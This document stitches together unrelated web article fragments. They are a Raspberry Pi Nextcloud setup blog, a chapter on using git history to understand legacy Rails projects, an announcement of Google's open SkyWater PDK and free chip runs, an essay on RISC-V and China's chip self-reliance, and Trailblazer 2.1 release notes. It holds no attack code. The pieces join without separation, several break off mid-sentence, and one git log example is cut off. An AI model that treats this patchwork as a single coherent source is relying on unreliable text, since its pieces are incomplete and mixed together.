<p>I did some more digging, and found what I believe to be the truth (or, as close as <em>I’ll</em> ever get to the truth). There appears to be a <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=247982" target="_blank" rel="noreferrer noopener">widely reported problem with the Pi 4</a> where the signals coming out from the HDMI (which are shaped like squares?) are the same frequency(?) as the WiFi. So, if your display resolution is pumped up high enough, and that HDMI is cranking out lots of square signals, <a href="https://www.raspberrypi.org/forums/viewtopic.php?p=1514642&amp;sid=b811be4b798c7ab50d7626c691b5cc26#p1514642" target="_blank" rel="noreferrer noopener">the WiFi gets totally borked</a>. Neat.</p>
<p>This is clearly absurd, and I hate it. Hardware is bad, and everyone saying “programmers gotta learn hardware too!!!” should get off my lawn. At first I started following the internet’s advice to simply “lower your screen resolution so the WiFi goes fast”, but this became tiring on the eyes (especially with the added problem of <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=250534" target="_blank" rel="noreferrer noopener">not being able to use redshift on the Pi</a>).</p>
<p>Even though I was reluctant to at first, eventually I started controlling my Pi via an SSH terminal from another machine to avoid this problem entirely. Boy oh boy, was this a joyful discovery. Not only was I freed from whatever stupid resolution the WiFi demanded, but I could also use my beloved blue-light filter to prevent my retinas from burning up. Sure, I had no GUI, but learning to do everything through the terminal came easily enough, and once I got there, I felt like some kind of computer wiz-kid.</p>
<h3 id="the-installation">The installation</h3>
<p>After the RAID was set up and I got SSH going, it was time to install Nextcloud. This proved to be shockingly difficult. There can’t just be a little <code>sudo apt install nextcloud</code> action, no no no no no. You need to install each little bit yourself, by hand, and glue every piece together (<code>nextcloud</code> isn’t even in the apt repository, of course you have to download / unpack something called a “tarball” yourself).</p>
<h4 id="attempt-1-snap">Attempt 1: Snap!</h4>
<p><a href="https://snapcraft.io/" target="_blank" rel="noreferrer noopener">Snap</a> is Canonical’s (maker of Ubuntu) locked-down little sandbox for Linux apps. The word “container” is thrown around when describing it, and I have no idea if that’s correct, but I sure as heck wouldn’t recommend the <a href="https://snapcraft.io/nextcloud" target="_blank" rel="noreferrer noopener">official Nextcloud snap</a>.</p>
<p>The major selling point of snap is that it bundles together an application’s dependencies, so it will <em>just work</em> on any Linux distribution. This sounds great! Sign me up! I’m lazy and hate installing my own dependencies! Who the heck wants to do that? Shell scripts, that’s who.</p>
<p>Problem is, this doesn’t <em>really</em> work on every distro, and in fact, it doesn’t work on the latest Raspberry Pi OS. Do I know why? No. The Nextcloud snap <a href="https://en.wikipedia.org/wiki/Fail-silent_system" target="_blank" rel="noreferrer noopener">failed silently</a> before starting up, and it was too shy to tell me why. Cool.</p>
<h4 id="attempt-2-some-shell-scripts-i-found">Attempt 2: Some shell scripts I found</h4>
<p>At this stage, I was still committed to being a lazy jerk. There’s no way in heck I would manually install <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html#prerequisites-for-manual-installation" target="_blank" rel="noreferrer noopener">30-something php modules</a> by hand. So, I found a <a href="https://ownyourbits.com/nextcloudpi/" target="_blank" rel="noreferrer noopener">flashy looking site that claimed to have the scripts for me</a>. It didn’t work. The script took multiple runs to actually complete itself, and after the 5th or so attempt, it seemed happy. I went to the web GUI, told it to “initialize”, and it kinda hung out there for a while. I went to take a walk, and when I came back and it was still pretending to initialize.</p>
<p>I found another <a href="https://github.com/nextcloud/vm" target="_blank" rel="noreferrer noopener">official-sounding shell script</a>, in a last-ditch attempt at being lazy. At least this script had the courage to fail immediately, as it’s <a href="https://github.com/nextcloud/vm/blob/master/nextcloud_install_production.sh/#L83" target="_blank" rel="noreferrer noopener">hardcoded to only work specifically on Ubuntu 20.04</a>. Would have been real nice if it had told me that up-front, but hey, I’m not the one going through the trouble of writing all these (failing) shell scripts.</p>
<h4 id="attempt-3-the-hard-way">Attempt 3: The hard way</h4>
<p>Being lazy clearly wasn’t going so well. By now several days had passed, and all I had to show for myself was a whole terabyte of nothing. Worse yet, the shell scripts I ran had spread their little tentacles all over my pure OS install, so I knew I’d have trouble in the future if I left all that cruft in-place. I decided to re-image my OS, and that I would repeat the RAID setup once I got Nextcloud going.</p>
<p>As previously mentioned, the <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html" target="_blank" rel="noreferrer noopener">recommended installation</a> wants you to install and hook each bit up together yourself. This approach made some sense as I learned (sort of, vaguely) more about how Nextcloud works - It’s running on a webserver directly on your machine, handling all the networking and whatnot, with a full-on SQL database and lots of PHP magic happening too. So, it’s understandable that Nextcloud has to spread it’s mischievous claws in each and every crevice of your OS.</p>
<p>I followed the <a href="https://docs.nextcloud.com/server/latest/admin_manual/index.html" target="_blank" rel="noreferrer noopener">Nextcloud documentation</a>, which sure does exist. In their defense, all of their software is <a href="https://en.wikipedia.org/wiki/Free_and_open-source_software" target="_blank" rel="noreferrer noopener">free and open</a>, including the docs, so I could have submitted any number of changes, and yet here I am selfishly writing this blog. The worst part of this process was the aforementioned php modules, which had to be installed one-by-one, and had mismatched names compared to the Debian repository. I had these all installed after about an hour, and I remember listening to a podcast in the background while suffering through it.</p>
<p>After <code>apt install</code>ing every module (seriously, why doesn’t php have it’s own package manager?!), then gliding through the initialization of Nextcloud with <code>occ</code>, my server was working. The <em>Nextcloud Hub</em> web interface greeted me with the most pleasant design and animations I had seen in quite some time. <strong>It was over. I had won.</strong></p>
<h3 id="conclusion">Conclusion</h3>
<p>All in all, I sure did have a time. The admin page still won’t stop whining about a …</p></div></div>

<h4>To keep track of how a project has been changing through time is key to provide a big picture of what things have been changing and why. After all, the business logic or the domain required those changes to be recorded. Read this to know why it is important to keep an eye on a project’s history.</h4>

<h2>Become a Git Historian</h2>
<p>This is chapter 2 of a series of blog posts about some pieces of advice, tools, and tips you can consider when you arrive at a Rails project considered as Legacy.</p>
<p>In the <a href="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html">previous chapter</a>, we reviewed our project’s anatomy.</p>
<p>In this chapter, we are using <a href="https://git-scm.com/">Git</a> and other tools related to it to find out more about our Rails Legacy System. But this time, it’s our project’s history turn.</p>
<p>First, I want us to understand ‘<strong>history</strong>‘ as:</p>
<blockquote><p>
  “The whole series of past events connected with someone or something”.
</p></blockquote>
<p>When speaking about history in a Rails project, it’s really important to check <em>how</em> our project has changed through time to get an idea of why things have been modified. Some of those adjustments were maybe done based on business logic, or maybe the domain required those changes.</p>
<p>Maybe, other changes happened because someone followed a particular path —which is a normal thing if you consider that every project is different and that there are infinite factors that can affect it in a positive or in a negative way.</p>
<span><span><a href="https://twitter.com/intent/tweet?url&amp;text=In%20Software%20Development%2C%20a%20legacy%20system%20is%20outdated%20computing%20software%20that%20is%20still%20in%20use.&amp;via=weareMagmaLabs&amp;related=weareMagmaLabs" target="_blank" rel="noopener noreferrer">In Software Development, a legacy system is outdated computing software that is still in use. </a></span><a href="https://twitter.com/intent/tweet?url&amp;text=In%20Software%20Development%2C%20a%20legacy%20system%20is%20outdated%20computing%20software%20that%20is%20still%20in%20use.&amp;via=weareMagmaLabs&amp;related=weareMagmaLabs" target="_blank" rel="noopener noreferrer">Click To Tweet</a></span>
<p>In Software Development, a legacy system is outdated computing software that is still in use. That system still meets the needs it was originally designed for but doesn’t allow growth. What a legacy system does now for the project is all it will ever do. A legacy system’s older technology won’t allow it to interact with newer systems.</p>

<p>Here is another interesting feature from git-extras, let’s try <code>git effort</code>:</p>
<pre><code>$ git effort --above 15 {src,lib}/*
</code></pre>
<blockquote><p>Displays “effort” statistics. Currently, it shows just the number of commits per file, highlighting the parts with the most activity. The “active days” column is the total number of days when contributed modifications to this file were made.</p></blockquote>

<p><a href="https://github.com/tj/git-extras"><code>git-extras</code></a> has many interesting features that you can explore and use to get a better understanding of your project.</p>
<h3>Git log</h3>
<p>Ok, now let’s understand how <em>change</em> on single objects works with <code>git log</code>.</p>
<pre><code>$ git log --patch --stat Gemfile

commit f6043a0c731de894f05328da79f04b9456931074

<p>As you can see, it will show why a specific update was made. Or, maybe it will just trigger more questions. But, at least you will be closer to your main goal, which is “understand what was the purpose of those changes”.</p>
<h3>Git History</h3>
<p>Also, if you prefer the fancy way and see the timeline of a particular file, you can try <code>git-history</code>.</p>
<p>Now, let’s use <a href="https://github.com/pomber/git-history">git-history</a>, which is like a visual time machine where you can visually review any change on a specific file and understand its timeline.</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg"><img data-attachment-id="5429" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/git_history_-_admin_html_slim" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=2084%2C1350" data-orig-size="2084,1350" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Git_History_-_admin_html_slim" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=300%2C194" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=1024%2C663" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1027%2C665" alt="" width="1027" height="665" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=300%2C194 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=200%2C130 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=768%2C498 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1024%2C663 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1200%2C777 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=860%2C557 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=680%2C440 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=400%2C259 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=50%2C32 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>
<p>Check this <a href="https://githistory.xyz/webdevtalks/www/blob/master/Gemfile">example</a> out.</p>
<h3>Look for Documentation (we’re using Git as well)</h3>
<p>As we look for documentation keep in mind and ask yourself the following:</p>
<ul>
<li>Is there any documentation at all?</li>
<li>Is there good commentary on the code?</li>
<li>Do the names of things make sense?</li>
<li>Are the System Use Cases documented?</li>
<li>Is there someone in the team that understands the system?</li>
</ul>
<p>We can use <code>git whatchange doc</code> to see logs and differences in our documentation, check the example above:</p>
<pre><code>$ git whatchanged doc
commit e43e0fecfb5914ec0e72eadff73e90c0e14c7026
Author: Daniel Contreras &lt;daniel.country.club@magmalabs.io&gt;
Date:   Thu Jan 28 19:32:35 2016 -0500

    Render diagram inline. Use AsciiDoc for the table of contents.

:100644 100644 13fa6c9d4 ff7935d08 R055 doc/client-system/README.md     doc/client-system/README.adoc
</code></pre>
<p>It seems that we have a doc folder. 🎉🎉🎉 It also seems like the last time a document was modified was in 2016, so it’s time to start documenting your new progress. That would help you in the future, and any other developer that joins the team.</p>
<h3>Extra: The README</h3>
<p>There is a README?  Well, yes. But it is so poor…</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg"><img data-attachment-id="5432" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/readme_template" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=2032%2C490" data-orig-size="2032,490" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="README_Template" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=300%2C72" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=1024%2C247" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1424%2C343" alt="" width="1424" height="343" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=300%2C72 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=200%2C48 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=768%2C185 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1024%2C247 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1200%2C289 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=860%2C207 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=680%2C164 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=400%2C96 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=50%2C12 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>
<p>Hey, but don’t worry, there are many templates you can use; like this <a href="https://github.com/dbader/readme-template" rel="noopener" target="_blank">example</a>.</p>
<h2>Wrap up</h2>
<p>Here are more things to keep in mind:</p>
<ul>
<li>Document everything you learn.</li>
<li>Keep documentation close to the code, simple is better.</li>
<li>You must understand the design/architecture.</li>
<li>Once you understand something, refine its documentation.</li>
</ul>
<p>I hope you find this blogpost compelling. In the following chapter, we are going to cover some nice toolings for static analysis of your code.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Did you ever dream about creating your own chip?
I mean, a physical chip.
One which you can hold in your hand, and which does exactly what you’ve designed it to do?</p>

<p>Until today, there were two major road blocks: you had to get access to a process design kit (PDK) from a chip manufacturing house (a foundry), and you had to have enough money to actually pay for the manufacturing.
These times are over.
Today.</p>

<p>Today, in a FOSSi Dial-Up talk, Tim Ansell of Google announced <a href="https://github.com/google/skywater-pdk">SkyWater PDK</a>, the first manufacturable, open source <a href="https://en.wikipedia.org/wiki/Process_design_kit">process design kit</a>.
What differentiates this PDK from previous attempts is the fact that it is manufacturable: with this PDK, you can actually produce chips with the <a href="https://www.skywatertechnology.com/">SkyWater foundry</a> in the 130nm node.</p>

<p>That leaves you as chip designer only with one road block: money.
Manufacturing chips is expensive – even for more than a decade old nodes like the 130nm node, you need to spend at least a couple thousand dollars.</p>

<p>You know what?
Don’t worry – Google and efabless have got you covered!
They are providing <strong>completely free of cost</strong> chip manufacturing runs: one in November this year, and multiple more in 2021.
All open source chip designs qualify, no further strings attached!</p>

<p>Learn more about all of that by re-watching <a href="https://www.youtube.com/watch?v=EczW2IWdnOM">Tim’s Dial-Up talk</a> or click through the <a href="https://docs.google.com/presentation/d/e/2PACX-1vRtwZPc8ykkkgtUkHkoJZrP9jKOo3FYdKqbg-So0ic6_kx7ha1vHnxrWmuxWkTc9GfC8xl0TfEpMLwK/pub?start=false&amp;loop=false&amp;delayms=3000">slides</a>.</p>

<p>This is certainly a dream come true for us at the FOSSi Foundation.
We helped the Free and Open Source Silicon community, our community, grow and tackle huge challenges over the years.
An open, manufacturable PDK was the main blocker in a fully open flow between RTL and a physical chip, and we’re extremely excited to see that blocker removed.</p>

<p>As always, removing one roadblock only highlights more challenges:
RAM, ROM and flash compilers, analog blocks, optimizations to various tools, and much, much more.
Now is the perfect time to get involved in the Free and Open Source Silicon ecosystem – or learn more about the accomplishments and challenges ahead of us.
A good starting point are the next Dial-Up talks.</p>

<p>Head over to the <a href="https://fossi-foundation.org/dial-up/">Dial-Up web site</a> for a listing of the upcoming talks on OpenROAD, cell design, OpenRAM, and Magic, an old, but surprisingly up-to-date tool!

                    <p>【想看中文的<a href="https://interconnected.blog/riscv-china-nightingales/#chinese-version-below">读者请点击这里</a>或滚动到本页下方】</p><p>Last weekend, I read <a href="https://www.huxiu.com/article/360061.html">a long, epic piece of techlore</a> that chronicled the fierce and bitter rivalry between TSMC and Samsung in their fight to become the world’s number 1 chip foundry, which stretched back three decades and continues today.</p><p>Among the many dramatic details was the “Nightingale program” that TSMC started in the mid-2010s to jumpstart its R&amp;D, because it was falling behind Samsung and losing Apple’s A9 chip orders to the Korean conglomerate. TSMC conceived of a three-shift, 24-hour non-stop R&amp;D operation, taking a page out of their fellow Taiwanese manufacturing behemoth Foxconn’s assembly operation. The “Nightingales” were engineers and researchers, who were willing to work the “graveyard shift” for a 30% increase in base salary and 50% increase in dividend payout. Due to this program, <strong>the total working hours clocked in Taiwan in 2014 was 2135</strong>, apparently the most of any economy in the world that year.</p><p>TSMC, and arguably Taiwan’s entire economy, was confronting an existential struggle at that time. SMIC (the largest chip foundry in China), and arguably China’s technological and economic future, is confronting a similarly existential struggle on a larger scale.</p><p>There are many interconnected elements that, when put together, could determine how China will come out on the other end of this struggle -- <strong>RISC-V, foundry technology, the “New Infrastructure” stimulus program, open source, and a few key TSMC personnels</strong>, who are now at the helm of China’s semiconductor industry.</p><p>Let’s take a look at each of them, sequentially and interconnectedly.</p><h2 id="risc-v-strengths-and-weaknesses">RISC-V: Strengths and Weaknesses</h2><p>The conversation around China’s journey towards technological self-reliance often involves <strong>RISC-V</strong> -- an open standard Instruction Set Architecture (ISA) for hardware that’s under open source licenses, thus any one can run, change, copy, and distribute it, in accordance with<a href="https://www.gnu.org/philosophy/free-sw.en.html"> the four freedoms</a> of open source.</p><figure><img src="https://lh6.googleusercontent.com/sVMZ8L3CA61u_kc0hdRdB9AItYEuK65vUJ70os7CAaFpogycLyqhYL_BbwMndKktijiEAF8Bi9WLyKCmW5ztmGE3Zhw2dQrRP0VwWcxWIsUqTFVFfYXIS4K5wp_SDExCRiug0cE1" alt=""><figcaption>RISC-V Ecosystem, courtesy of SiFive.</figcaption></figure><p>However, RISC-V is still young. Its<a href="https://riscv.org/specifications/"> user-space ISA</a> and<a href="https://riscv.org/specifications/privileged-isa/"> privileged ISA</a> wasn’t frozen, and thus ready for large-scale software and hardware development, until June 2019. The technology and community ecosystem is maturing, and support from large Chinese organizations has a lot to do with it. Of <a href="https://riscv.org/members-at-a-glance/">the six Premier Members</a> of the official RISC-V foundation, RISC-V International, &nbsp;four are Chinese organizations -- Alibaba, Huawei, RIOS Lab, and the Institute of Computing Technology of the Chinese Academy of Sciences.</p><p>But in the near future (say the next five years), what can RISC-V, the technology, realistically enable China to accomplish?</p><p><strong>What is it good for?</strong> &nbsp;RISC-V is a very good foundation for rapidly prototyping and building <strong>special purpose</strong> chips. The development cycle and experience feels closer to software than hardware. This speed in development is partly because it’s open-sourced -- no hassle in getting a commercial license, as oppose to its proprietary counterparts like ARM -- and also partly because the ISA itself is simplified and “reduced” (i.e. the R in RISC), as opposed to CISC (the C means “complex”) which underpins more powerful, proprietary ISAs like Intel’s x86. This reduced architecture enables and optimizes simple computation instructions well, literally elementary school math: addition, subtraction, multiplication, division, etc. It’s less capable of supporting complex mathematical operations, like matrix multiplication and partial derivative (used widely in Deep Learning AI).</p><p>Thus, in reality, chips designed using RISC-V have been used most commonly in <strong>IoT and embedded systems</strong> scenarios. Because of its simplicity and malleability, RISC-V chips also <strong>tend to have low power consumption</strong>, which is a good attribute when battery life is an issue, e.g. wearable devices. This reduced simplicity also means that the compiler (the software layer that translates code, like C, into machine instructions for a chip to execute) does not need to be purposefully designed to optimize performance on RISC-V. Using some common compilers <a href="https://riscv.org/software-status/#c-compilers-and-libraries">like GCC, which RISC-V </a>supports, will do.</p><p><strong>What does it lack? </strong>As you might’ve guessed, RISC-V’s reduced simplicity is also the source of its limitations. While many people like to pit RISC-V against a general purpose ISAs, like Intel’s, <strong>they are more compliments than competitors. </strong>In fact, special purpose RISC-V chips that accelerate certain computations for AI workloads do run side-by-side along general purpose Intel chips in the cloud. It’ll be a long time (more than five years, in my opinion) before RISC-V can enable the design of a <strong>general purpose</strong> chip that powers our iPhones, laptops, or cloud computing servers in a data center, with enough developers incentivized to both extend the ISA and the compiler and other infrastructure software on top of it.</p><p><strong>Can RISC-V become general purpose some day?</strong> Of course. <strong>But that’s not an inevitability</strong>. It’s <strong>a strategic choice</strong> that the RISC-V community can make and work towards, with all the complexity in upstream coordination, developer community building, and open governance, not to mention the work of building the technology itself, that must be executed collectively. That possible future is perhaps the most interesting question when we think about China’s self-reliance, which I’ll discuss in more detail below <strong>in the context of fostering open source</strong>.</p><h2 id="-new-infrastructure-">“New Infrastructure”</h2><p>With the strengths and weaknesses of RISC-V in mind, let’s see where RISC-V chips could get deployed in China’s economy and infrastructure in the foreseeable future.</p><p>It’s no secret that central government industrial policy matters a lot in China, even though its market-driven economy is what materializes much of that vision. The most relevant piece of policy is <a href="http://www.china.org.cn/business/2020-04/22/content_75961988.htm">the “New Infrastructure” spending plan </a>that came out of the National Development and Reform Commission, as a response to the COVID-19 pandemic to boost the economy. This infrastructure stimulus plan sits in a larger context of two other long-term strategic plans: Made in China 2025 and China Standards 2035.</p><p>The details of this “New Infrastructure” plan have emerged in the last couple months, with major emphasis in IT and digital infrastructure, not just traditional infrastructure like highways and railroads. As it often happens in China, the signals sent from the top have already shifted private investment dollars. Nascent chip startups, all of a sudden, are <a href="https://uk.reuters.com/article/uk-china-semiconductors-analysis/sino-u-s-tech-race-turbo-charges-china-chip-investment-triggering-bubble-fear-idUKKBN23V3CO">enjoying investor attention and bubbly valuations</a>.</p><p>With that said, here are some of the “New Infrastructure” sectors that I think RISC-V could play an immediate role in, given its strengths:</p><ul><li>IoT</li><li>Smart transportation</li><li>New energy vehicle chargers</li><li>Limited AI (specific workloads that need customized acceleration)</li><li>Autonomous vehicles (limited to certain types of sensors and data collection)</li></ul><p>And as for sectors that I don’t see RISC-V making much of a dent, given its current limitations:</p><ul><li>Cloud computing</li><li>5G (both base station construction and consumer devices)</li><li>Blockchain</li><li>Data centers</li><li>Big data</li><li>Large-scale AI training and production deployment</li></ul><p>As you can see, RISC-V impact would be limited,<strong> but not insignificant</strong>. The logical next step would be for China to help evolve RISC-V <strong>into a more general purpose ISA</strong>, and reduce its reliance on proprietary solutions from ARM or Intel that could always be subjected to more sanctions.</p><p>The path to that end would have to be fostering open source <strong>and doing it the right way.</strong></p><h2 id="fostering-open-source-the-right-way">Fostering Open Source, the Right Way</h2><p>Open source has been popping up in <a href="https://mp.weixin.qq.com/s/Qcze4R-7zL2wjMh_DNVCIQ">a lot of discussions</a> in various Chinese technical and R&amp;D communities, triggered in particular by MATLAB being now off-limit to Chinese universities that are on the U.S. export control entity list. The discussion inevitably leads to open source: are there open source alternatives to MATLAB? What about CAD softwares, like EDA tools, which every chip foundry needs? Will there be an open source EDA option?</p><p>Implicit in these discussions is a predominant “takers” mentality towards open source. In China, open source solutions are mostly seen as “free stuff” that you can take and use, without any expectation or incentive to give back (or in open source parlance: “contribute upstream”).</p><p>It’s already happening in RISC-V. Alibaba <a href="https://www.techspot.com/news/81177-china-alibaba-making-16-core-25-ghz-risc.html">sports the fastest RISC-V based processor to date</a>, but there’s no intention to my knowledge for the design to also be open-sourced or at least publicly shared for the benefit of the ecosystem. Many small startups in China, now showered with new investments, are doing the same -- using RISC-V to make special purpose chips that are effectively proprietary.</p><p><em>(This is not to generalize that all Chinese organizations are bad open source players; some are contributing a lot and have open source in their DNA. I’ve profiled many of the big tech firms and some startups from the lens in Part II of my “</em><a href="https://interconnected.blog/open-source-in-china-the-game/"><em>Open Source in China</em></a><em>” series.)</em></p><p><strong>If</strong> China hopes to evolve RISC-V into a more powerful, general-purpose building block to achieve semiconductor self-reliance, Chinese organizations, both individually and collectively, would have to shift from a zero-sum “takers” mentality to a positive-sum “stakeholders” mentality. What that means in reality is absorbing and practicing the open source way of doing things -- not just contributing code upstream and being more willing to share, but also behaviors like transparent governance, open discussions with other stakeholders and developers, and clear due process for decision-making, big and small. <strong>These are both technical and human complexities.</strong></p><p>With an existential struggle at hand, there’s reason to believe that Chinese companies may behave differently for the sake of achieving a national imperative and be less concerned about the tit-for-tat, zero-sum nature of market competition, which is quite cutthroat in China. And<strong> if done right</strong>, RISC-V could unleash massive technological innovation broadly and help China deal with its existential struggle specifically.</p><h2 id="foundries-smic-hsmc">Foundries: SMIC, HSMC</h2><p>Let’…</p></div></section></article></div></div></div>

<h2 id="blog-official-2-1-release-notes">Official 2.1 Release Notes</h2>


<p>(Not that there’s an unofficial one anywhere, but yeah…)</p>



<p>After around 3 years of silence, Trailblazer is back with its 2.1 release. Lots of improvements on the core gems come hand-in-hand with a quite flat migration path, so don’t ya worry! We’re also proud to tell you all about our new upcoming projects in this post, as well as communicating a looot of background about what’s been going on in those past few years.</p>

<p>Here’s a quick summary for those who want to get back to coding.</p>

<ul>
  <li><strong>API CHANGE</strong> The <code>call</code> API has <a href="#blog-official-2-1-release-notes-api-changes">slightly changed</a> from two arguments to just one.</li>
  <li><strong>AUTOLOADING</strong> We removed the <code>trailblazer-loader</code> gem just like Apple removed the headphone jack from the iPhone 6. <a href="#blog-official-2-1-release-notes-loader-startup-speed">This brings you</a> faster startup and consistency with Rails autoloading.</li>
  <li><strong>DOCUMENTATION</strong> We have a <a href="#blog-official-2-1-release-notes-new-website">new website</a>.</li>
  <li><strong>TRACING</strong> We heard your cries. You can now see what path an operation took and use exception tracing for a <a href="#blog-official-2-1-release-notes-developer-experience">beautiful dev experience</a>.</li>
</ul>



<h3 id="blog-official-2-1-release-notes-good-to-see-you-again-">Good to see you, again!</h3>


<p>It almost feels unreal finishing up this release post. It’s been so long! The work put into Trailblazer 2.1 has been tremendous, it could easily have been TRB 3.0, or even TRB III, since Roman version numbering turns out to be quite a fancy thing to do. However, as much as the internals have been improved, as little has changed on the public APIs of Trailblazer, so we decided to go with a minor release.</p>

<p>With the introduction of another new callback <code>after_save_commit</code> in Rails 6 it becomes obvious that we do have a problem in software engineering: how do we structure business code? We do have a few dozen database abstractions in every language, well written and designed, but, yeah, how do I structure the actual code of my domain, of my application’s needs? What’s the best way to put together application functions, put them in order, prevent other functions from being executed when it’s not the time, and so on?</p>

<p>Trailblazer is an architectural style coming as a framework to implement our patterns, trying to answer that one question: “How do I implement business processes?”. It gives you strong conventions along with patterns to structure your code flow better, handle errors, and integrate those components into bigger flows - or <em>processes</em>.</p>

<p>Having said that, I let you decide whether or not you join the ride! There is nothing wrong with building your own “service layer”, and many companies have left the Traiblazer track in the past years due to problems they had and that we think we now fixed.</p>

<p>Speaking of problems, the craziness of the past years working on Trailblazer 2.1 can be visualized with the following screenshot.</p>

<p><img src="https://trailblazer.to/images//2.1/blog-subl.png"></p>

<p>Very often, in order to fix one function <em>A</em> in a commercial app, I had to rewire a track in the <code>endpoint</code> gem, which would only work if I add another DSL option in the <code>dsl</code> gem, which couldn’t work straight away because the normalizer in the <code>context</code> gem needed to be extended, which was only possible if you could finally extract the start event via the <code>activity</code> gem whose test suite was currently broken because I needed to document feature <code>x</code> first, which couldn’t be documented because before I had to allow dynamic params in the <code>macro</code> gem and… I think you got my point.</p>

<p>Luckily, I got help from a band of great people, I took it easy on the conference front, and for some other reasons I still don’t understand all this is now finished and here’s TRB 2.1.</p>



<h3 id="blog-official-2-1-release-notes-about-the-design">About the Design</h3>


<p>A big change from TRB 1.1 and even 2.0 is that we apply functional principles in most places. We barely keep state in instance variables. Rather, data is passed around from operation to operation, from step to step. We use OOP and inheritance solely for compile-time configuration. You define classes, steps, tracks and flows, inherit those, customize them using Ruby’s built-in mechanics, but this all happens at compile-time. At runtime, no structures are changed anymore, your code is executed dynamically but only the <code>ctx</code> (formerly <code>options</code>) and its objects are mutated. This massively improves the code quality and with it, the runtime stability, which Ruby is famous for *cough.</p>

<p>I extracted a lot of smaller libraries from the original <code>trailblazer</code> gem. Most gems use the <code>activity</code> gem itself, which is the core of an operation and provides the runtime object that executes your steps in a certain order. It’s so simple that I sometimes wonder why it took years to develop it! But all those little interfaces, structures and principles that you see as “common sense”, they took a while to figure out.</p>

